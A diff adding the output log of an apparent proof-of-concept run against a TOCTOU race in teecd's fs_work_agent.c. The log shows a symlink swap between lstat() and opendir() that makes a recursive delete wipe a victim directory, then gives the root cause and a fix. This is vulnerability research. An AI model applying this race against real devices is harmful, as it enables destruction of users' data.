@@ -1,0 +1,21 @@
+[*] Creating stubs for teecd dependencies...
+[*] Extracting vulnerable functions from fs_work_agent.c ...
+[*] Compiling extracted vulnerable code ...
+[*] Compiling PoC driver ...
+[*] Linking ...
+[*] Running PoC ...
+[POC] Test dir:    /tmp/fswork_poc_fsqV9q
+[POC] Bait dir:    /tmp/fswork_poc_fsqV9q/ta_storage_dir
+[POC] Victim dir:  /tmp/fswork_poc_fsqV9q/victim_tree
+[POC] Victim file: /tmp/fswork_poc_fsqV9q/victim_tree/important.dat
+
+[POC] Attack: lstat sees real dir → racer swaps to symlink → opendir follows symlink → victim tree deleted
+
+[+] RACE WON on attempt 1501!
+[+] Victim file /tmp/fswork_poc_fsqV9q/victim_tree/important.dat was DELETED!
+[+] opendir() followed symlink → recursive delete hit victim tree.
+
+[RESULT] TOCTOU race condition CONFIRMED.
+  Root cause: lstat() determines dir, opendir() follows symlinks
+  Fix: Open parent dir fd, use fstatat + openat(O_NOFOLLOW)
+[*] Exit code: 0
